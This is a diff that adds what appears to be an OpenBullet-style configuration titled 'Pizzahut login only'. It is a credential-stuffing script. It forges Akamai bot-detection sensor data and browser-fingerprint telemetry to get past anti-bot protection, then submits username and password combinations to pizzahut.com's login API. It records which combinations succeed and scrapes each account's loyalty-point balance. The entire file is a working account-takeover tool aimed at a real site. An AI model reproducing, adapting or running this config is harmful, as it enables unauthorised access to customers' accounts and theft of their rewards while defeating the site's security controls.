@@ -1,0 +1,153 @@
+[SETTINGS]
+{
+  "Name": "Pizzahut login only",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2019-08-21T21:21:38.4162225-07:00",
+  "AdditionalInfo": "",
+  "Author": "Jesse#9634",
+  "Version": "1.3.8 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION GetRandomUA -> VAR "UA" 
+
+FUNCTION RandomNum 1 99 -> VAR "N1" 
+
+FUNCTION RandomNum 111 999 -> VAR "NO" 
+
+REQUEST GET "pizzahut.com/" 
+  
+  COOKIE "AKA_A2: A" 
+  COOKIE "email: <USER>" 
+  COOKIE "www-siteview: www" 
+  HEADER "User-Agent: <UA>" 
+  HEADER ": authority: www.pizzahut.com" 
+  HEADER "Host: www.pizzahut.com" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "sec-fetch-mode: navigate" 
+  HEADER "sec-fetch-site: none" 
+  HEADER "sec-fetch-user: ?1" 
+  HEADER "upgrade-insecure-requests: 1" 
+
+REQUEST POST "https://www.pizzahut.com/static/7aab90f631a185d9a2449596595a694" 
+  
+  HEADER "User-Agent: <UA>" 
+  HEADER "Pragma: no-cache" 
+  HEADER ": authority: www.pizzahut.com" 
+  HEADER "Accept: */*" 
+  HEADER "Host: www.pizzahut.com" 
+
+REQUEST GET "https://www.pizzahut.com/akam/11/78d5d5f7" 
+  
+  HEADER "User-Agent: <UA>" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<COOKIES(_abck)>" LR "" "" -> VAR "abck" 
+
+REQUEST POST "https://www.pizzahut.com/static/56693fd9a8f185d9a2449596595a694" 
+  CONTENT "{\"sensor_data\":\"7a74G7m23Vrp0o5c9070361.41-1,2,-94,-100,<UA>,uaend,12147,20030107,en-US,Gecko,3,0,0,0,383333,645923824,1536,864,1036,674,1051,,cpen:0,i1:0,dm:0,cwen:0,non:1,opc:0,fc:0,sc:0,wrc:1,isc:0,vib:1,bat:1,x11:0,x12:1,7353,0.423587715211,77<NO>3229<NO>,loc:-1,2,-94,-101,do_en,dm_en,t_en-1,2,-94,-105,0,-1,0,0,1083,-1,0;0,-1,0,0,864,-1,0;1,-1,0,0,883,-1,0;0,-1,0,0,1162,-1,0;1,-1,0,0,1181,-1,0;-1,2,-94,-102,0,0,0,0,1083,-1,0;0,-1,0,0,864,-1,0;1,-1,0,0,883,-1,0;0,-1,0,0,1162,-1,0;1,-1,0,0,1181,-1,0;-1,2,-94,-108,-1,2,-94,-110,0,1,2<NO>,<NO>,67;1,1,2202,539,72;2,1,2206,542,76;3,1,2210,544,81;4,1,2214,548,84;5,1,2218,550,89;6,1,2222,552,96;7,1,2226,554,101;8,1,2231,557,107;9,1,2234,559,112;10,1,2242,560,120;11,1,2247,563,127;12,1,2248,564,134;13,1,2250,567,140;14,1,2254,569,149;15,1,2259,570,157;16,1,2264,571,164;17,1,2267,572,172;18,1,2270,573,179;19,1,2275,574,186;20,1,2278,574,192;21,1,2282,575,200;22,1,2286,575,205;23,1,2291,576,212;24,1,2295,576,219;25,1,2298,576,224;26,1,2302,576,231;27,1,2306,576,237;28,1,2311,576,244;29,1,2318,576,255;30,1,2323,576,260;31,1,2328,576,266;32,1,2329,576,270;33,1,2332,576,276;34,1,2336,576,280;35,1,2344,576,284;36,1,2345,576,288;37,1,2348,576,292;38,1,2354,575,296;39,1,2356,574,300;40,1,2362,574,303;41,1,2364,574,306;42,1,2368,573,308;43,1,2372,572,312;44,1,2378,572,315;45,1,2380,572,317;46,1,2384,572,319;47,1,2388,572,322;48,1,2396,572,324;49,1,2397,571,328;50,1,2401,571,329;51,1,2404,570,332;52,1,2410,569,334;53,1,2412,569,336;54,1,2416,569,339;55,1,2420,569,341;56,1,2428,569,344;57,1,2429,569,345;58,1,2432,568,348;59,1,2436,568,352;60,1,2443,568,355;61,1,2446,568,359;62,1,2448,568,362;63,1,2452,568,366;64,1,2456,568,369;65,1,2460,568,373;66,1,2465,568,377;67,1,2469,568,380;68,1,2472,568,384;69,1,2477,568,387;70,1,2480,568,391;71,1,2485,568,396;72,1,2488,568,400;73,1,2494,568,405;74,1,2497,568,411;75,1,2500,569,416;76,1,2504,571,420;77,1,2506,572,425;78,1,2511,574,431;79,1,2514,575,435;80,1,2519,576,440;81,1,2522,577,445;82,1,2527,580,451;83,1,2530,581,456;84,1,2534,582,460;85,1,2538,584,465;86,1,2543,586,472;87,1,2546,587,476;88,1,2550,588,481;89,1,2554,589,487;90,1,2558,591,492;91,1,2562,592,496;92,1,2566,592,500;93,1,2571,593,506;94,1,2575,594,512;95,1,2580,595,516;96,1,2583,596,520;97,1,2586,596,524;98,1,2591,597,528;99,1,2596,597,532;224,3,12909,253,272,864;-1,2,-94,-117,-1,2,-94,-111,0,<NO>,-1,-1,-1;-1,2,-94,-109,0,<NO>,-1,-1,-1,-1,-1,-1,-1,-1,-1;-1,2,-94,-114,-1,2,-94,-103,2,<NO>;3,11600;-1,2,-94,-112,https://www.ae.com/content/help/my-account-1,2,-94,-115,1,347330,0,669,668,0,348666,12909,0,1557966459206,16,16666,0,2<N1>,2777,1,0,<NO>13,<NO>021,0,<ABCK>,29<NO>,<NO>,-97<NO>5174,<NO>61693-1,2,-94,-106,1,1-1,2,-94,-119,137,153,150,123,169,142,169,136,135,134,120,140,129,502,-1,2,-94,-122,0,0,1,0,1,0,0-1,2,-94,-123,-1,2,-94,-70,-1833641851;dis;,7,8;true;true;true;-345;true;24;24;true;false;-1-1,2,-94,-80,5054-1,2,-94,-116,<NO>9250-1,2,-94,-118,180<NO>-1,2,-94,-121,;<N1>;45;1\"}{\"sensor_data\":\"7a74G7m23Vrp0o5c9079731.41-1,2,-94,-100,<UA>,uaend,12147,20030107,en-US,Gecko,3,0,0,0,383333,6459235,1536,824,1536,864,1036,674,1051,,cpen:0,i1:0,dm:0,cwen:0,non:1,opc:0,fc:0,sc:0,wrc:1,isc:0,vib:1,bat:1,x11:0,x12:1,7353,0.423587715211,77<NO>3229<NO>,loc:-1,2,-94,-101,do_en,dm_en,t_en-1,2,-94,-105,0,-1,0,0,1083,-1,0;0,-1,0,0,864,-1,0;1,-1,0,0,883,-1,0;0,-1,0,0,1162,-1,0;1,-1,0,0,1181,-1,0;-1,2,-94,-102,0,0,0,0,1083,-1,0;0,-1,0,0,864,-1,0;1,-1,0,0,883,-1,0;0,-1,0,0,1162,-1,0;1,-1,0,0,1181,-1,0;-1,2,-94,-108,-1,2,-94,-110,0,1,2<NO>,<NO>,67;1,1,2202,539,72;2,1,2206,542,76;3,1,2210,544,81;4,1,2214,548,84;5,1,2218,550,89;6,1,2222,552,96;7,1,2226,554,101;8,1,2231,557,107;9,1,2234,559,112;10,1,2242,560,120;11,1,2247,563,127;12,1,2248,564,134;13,1,2250,567,140;14,1,2254,569,149;15,1,2259,570,157;16,1,2264,571,164;17,1,2267,572,172;18,1,2270,573,179;19,1,2275,574,186;20,1,2278,574,192;21,1,2282,575,200;22,1,2286,575,205;23,1,2291,576,212;24,1,2295,576,219;25,1,2298,576,224;26,1,2302,576,231;27,1,2306,576,237;28,1,2311,576,244;29,1,2318,576,255;30,1,2323,576,260;31,1,2328,576,266;32,1,2329,576,270;33,1,2332,576,276;34,1,2336,576,280;35,1,2344,576,284;36,1,2345,576,288;37,1,2348,576,292;38,1,2354,575,296;39,1,2356,574,300;40,1,2362,574,303;41,1,2364,574,306;42,1,2368,573,308;43,1,2372,572,312;44,1,2378,572,315;45,1,2380,572,317;46,1,2384,572,319;47,1,2388,572,322;48,1,2396,572,324;49,1,2397,571,328;50,1,2401,571,329;51,1,2404,570,332;52,1,2410,569,334;53,1,2412,569,336;54,1,2416,569,339;55,1,2420,569,341;56,1,2428,569,344;57,1,2429,569,345;58,1,2432,568,348;59,1,2436,568,352;60,1,2443,568,355;61,1,2446,568,359;62,1,2448,568,362;63,1,2452,568,366;64,1,2456,568,369;65,1,2460,568,373;66,1,2465,568,377;67,1,2469,568,380;68,1,2472,568,384;69,1,2477,568,387;70,1,2480,568,391;71,1,2485,568,396;72,1,2488,568,400;73,1,2494,568,405;74,1,2497,568,411;75,1,2500,569,416;76,1,2504,571,420;77,1,2506,572,425;78,1,2511,574,431;79,1,2514,575,435;80,1,2519,576,440;81,1,2522,577,445;82,1,2527,580,451;83,1,2530,581,456;84,1,2534,582,460;85,1,2538,584,465;86,1,2543,586,472;87,1,2546,587,476;88,1,2550,588,481;89,1,2554,589,487;90,1,2558,591,492;91,1,2562,592,496;92,1,2566,592,500;93,1,2571,593,506;94,1,2575,594,512;95,1,2580,595,516;96,1,2583,596,520;97,1,2586,596,524;98,1,2591,597,528;99,1,2596,597,532;224,3,12909,253,272,864;-1,2,-94,-117,-1,2,-94,-111,0,<NO>,-1,-1,-1;-1,2,-94,-109,0,<NO>,-1,-1,-1,-1,-1,-1,-1,-1,-1;-1,2,-94,-109,0,<NO>,-1,-1,-1,-1,-1,-1,-1,-1,-1;-1,2,-94,-109,0,<NO>,-1,-1,-1,-1,-1,-1,-1,-1,-1;-1,2,-94,-114,-1,2,-94,-103,2,<NO>;3,11600;-1,2,-94,-112,https://www.kohls.com/myaccount/kohls_login.jsp-1,2,-94,-115,1,347330,0,669,668,0,348666,12909,0,1557966459206,16,16666,0,2<N1>,2777,1,0,<NO>13,<NO>021,0,<finalTest>,136,135,134,120,140,129,502,-1,2,-94,-122,0,0,1,0,1,0,0-1,2,-94,-123,-1,2,-94,-70,-1833641851;dis;,7,8;true;true;true;-345;true;24;24;true;false;-1-1,2,-94,-80,5054-1,2,-94,-116,<NO>9250-1,2,-94,-118,180<NO>-1,2,-94,-121,;<N1>;45;1\"}" 
+  CONTENTTYPE "text/plain" 
+  HEADER "User-Agent: <UA>" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Ban OR 
+    KEY "{\"success\": false}" 
+  KEYCHAIN Success OR 
+    KEY "\"success\": true" 
+
+REQUEST GET "https://www.pizzahut.com/akam/11/pixel_78d5d5f7" 
+  CONTENT "ap=true&bt=%7B%22charging%22%3Atrue%2C%22chargingTime%22%3A0%2C%22dischargingTime%22%3A%22Infinity%22%2C%22level%22%3A1%2C%22onchargingchange%22%3Anull%2C%22onchargingtimechange%22%3Anull%2C%22ondischargingtimechange%22%3Anull%2C%22onlevelchange%22%3Anull%7D&fonts=7%2C63&fh=fd93e714c2d4dd2d57da0040151ad1301d069e1a&timing=%7B%221%22%3A73%2C%222%22%3A373%2C%223%22%3A594%2C%22profile%22%3A%7B%22bp%22%3A0%2C%22sr%22%3A1%2C%22dp%22%3A1%2C%22lt%22%3A0%2C%22ps%22%3A0%2C%22cv%22%3A39%2C%22fp%22%3A0%2C%22sp%22%3A1%2C%22br%22%3A0%2C%22ieps%22%3A0%2C%22av%22%3A0%2C%22z1%22%3A21%2C%22jsv%22%3A1%2C%22nav%22%3A1%2C%22nap%22%3A6%2C%22crc%22%3A1%2C%22z2%22%3A0%2C%22z3%22%3A1%2C%22fonts%22%3A220%7D%2C%22main%22%3A1117%2C%22compute%22%3A73%2C%22send%22%3A815%7D&bp=1038350511%2C-1979380391%2C1738406762%2C749224105&sr=%7B%22inner%22%3A%5B1120%2C888%5D%2C%22outer%22%3A%5B1920%2C1040%5D%2C%22screen%22%3A%5B0%2C0%5D%2C%22pageOffset%22%3A%5B0%2C0%5D%2C%22avail%22%3A%5B1920%2C1040%5D%2C%22size%22%3A%5B1920%2C1080%5D%2C%22client%22%3A%5B1120%2C888%5D%2C%22colorDepth%22%3A24%2C%22pixelDepth%22%3A24%7D&dp=%7B%22XDomainRequest%22%3A0%2C%22createPopup%22%3A0%2C%22removeEventListener%22%3A1%2C%22globalStorage%22%3A0%2C%22openDatabase%22%3A1%2C%22indexedDB%22%3A1%2C%22attachEvent%22%3A0%2C%22ActiveXObject%22%3A0%2C%22dispatchEvent%22%3A1%2C%22addBehavior%22%3A0%2C%22addEventListener%22%3A1%2C%22detachEvent%22%3A0%2C%22fireEvent%22%3A0%2C%22MutationObserver%22%3A1%2C%22HTMLMenuItemElement%22%3A0%2C%22Int8Array%22%3A1%2C%22postMessage%22%3A1%2C%22querySelector%22%3A1%2C%22getElementsByClassName%22%3A1%2C%22images%22%3A1%2C%22compatMode%22%3A%22CSS1Compat%22%2C%22documentMode%22%3A0%2C%22all%22%3A1%2C%22now%22%3A1%2C%22contextMenu%22%3A0%7D&lt=1565601461697-7&ps=true%2Ctrue&cv=0c746aa6743036d3834aeeaf1a96693b7465b169&fp=false&sp=false&br=Chrome&ieps=false&av=false&z=%7B%22a%22%3A2027280074%2C%22b%22%3A1%2C%22c%22%3A0%7D&zh=&jsv=1.7&nav=%7B%22userAgent%22%3A%22Mozilla%2F5.0%20(Windows%20NT%2010.0%3B%20Win64%3B%20x64)%20AppleWebKit%2F537.36%20(KHTML%2C%20like%20Gecko)%20Chrome%2F76.0.3809.100%20Safari%2F537.36%22%2C%22appName%22%3A%22Netscape%22%2C%22appCodeName%22%3A%22Mozilla%22%2C%22appVersion%22%3A%225.0%20(Windows%20NT%2010.0%3B%20Win64%3B%20x64)%20AppleWebKit%2F537.36%20(KHTML%2C%20like%20Gecko)%20Chrome%2F76.0.3809.100%20Safari%2F537.36%22%2C%22appMinorVersion%22%3A0%2C%22product%22%3A%22Gecko%22%2C%22productSub%22%3A%2220030107%22%2C%22vendor%22%3A%22Google%20Inc.%22%2C%22vendorSub%22%3A%22%22%2C%22buildID%22%3A0%2C%22platform%22%3A%22Win32%22%2C%22oscpu%22%3A0%2C%22hardwareConcurrency%22%3A4%2C%22language%22%3A%22en-US%22%2C%22languages%22%3A%5B%22en-US%22%2C%22en%22%5D%2C%22systemLanguage%22%3A0%2C%22userLanguage%22%3A0%2C%22doNotTrack%22%3Anull%2C%22msDoNotTrack%22%3A0%2C%22cookieEnabled%22%3Atrue%2C%22geolocation%22%3A1%2C%22vibrate%22%3A1%2C%22maxTouchPoints%22%3A0%2C%22webdriver%22%3A0%2C%22plugins%22%3A%5B%22Chrome%20PDF%20Plugin%22%2C%22Chrome%20PDF%20Viewer%22%2C%22Native%20Client%22%5D%7D&crc=%7B%22window.chrome%22%3A%7B%22app%22%3A%7B%22isInstalled%22%3Afalse%2C%22InstallState%22%3A%7B%22DISABLED%22%3A%22disabled%22%2C%22INSTALLED%22%3A%22installed%22%2C%22NOT_INSTALLED%22%3A%22not_installed%22%7D%2C%22RunningState%22%3A%7B%22CANNOT_RUN%22%3A%22cannot_run%22%2C%22READY_TO_RUN%22%3A%22ready_to_run%22%2C%22RUNNING%22%3A%22running%22%7D%7D%2C%22runtime%22%3A%7B%22OnInstalledReason%22%3A%7B%22CHROME_UPDATE%22%3A%22chrome_update%22%2C%22INSTALL%22%3A%22install%22%2C%22SHARED_MODULE_UPDATE%22%3A%22shared_module_update%22%2C%22UPDATE%22%3A%22update%22%7D%2C%22OnRestartRequiredReason%22%3A%7B%22APP_UPDATE%22%3A%22app_update%22%2C%22OS_UPDATE%22%3A%22os_update%22%2C%22PERIODIC%22%3A%22periodic%22%7D%2C%22PlatformArch%22%3A%7B%22ARM%22%3A%22arm%22%2C%22MIPS%22%3A%22mips%22%2C%22MIPS64%22%3A%22mips64%22%2C%22X86_32%22%3A%22x86-32%22%2C%22X86_64%22%3A%22x86-64%22%7D%2C%22PlatformNaclArch%22%3A%7B%22ARM%22%3A%22arm%22%2C%22MIPS%22%3A%22mips%22%2C%22MIPS64%22%3A%22mips64%22%2C%22X86_32%22%3A%22x86-32%22%2C%22X86_64%22%3A%22x86-64%22%7D%2C%22PlatformOs%22%3A%7B%22ANDROID%22%3A%22android%22%2C%22CROS%22%3A%22cros%22%2C%22LINUX%22%3A%22linux%22%2C%22MAC%22%3A%22mac%22%2C%22OPENBSD%22%3A%22openbsd%22%2C%22WIN%22%3A%22win%22%7D%2C%22RequestUpdateCheckStatus%22%3A%7B%22NO_UPDATE%22%3A%22no_update%22%2C%22THROTTLED%22%3A%22throttled%22%2C%22UPDATE_AVAILABLE%22%3A%22update_available%22%7D%7D%7D%7D&t=3b1266d32604d67fd6fdaf9218effc3216bc4be4&u=07a8399956745094a216554afa8ead6e&nap=11321144241322243122&fc=false" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: <UA>" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+REQUEST GET "pizzahut.com" 
+  
+  HEADER "User-Agent: <UA>" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+REQUEST POST "www.pizzahut.com/init.php" 
+  
+  HEADER "User-Agent: <UA>" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "origin: https://www.pizzahut.com" 
+  HEADER "referer: https://www.pizzahut.com/index.php" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER ": scheme: https" 
+
+REQUEST GET "pizzahut.com/index.php" 
+  
+  HEADER "User-Agent: <UA>" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Host: www.pizzahut.com" 
+  HEADER "Referer: https://www.pizzahut.com/index.php" 
+  HEADER "Origin: https://www.pizzahut.com" 
+
+REQUEST POST "www.pizzahut.com/api.php/site/api_ajax/login/do_login" 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\",\"remember\":true,\"recaptcha2\":\"\",\"loyalty\":\"\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: <UA>" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "origin: https://www.pizzahut.com" 
+  HEADER "referer: https://www.pizzahut.com/index.php" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER ": scheme: https" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "{\"success\":true,\"" 
+  KEYCHAIN Failure OR 
+    KEY "{\"success\":false,\"" 
+
+PARSE "<SOURCE>" LR "{\"available_pts\":" ",\"locked_pts\"" -> CAP "Points" 
+
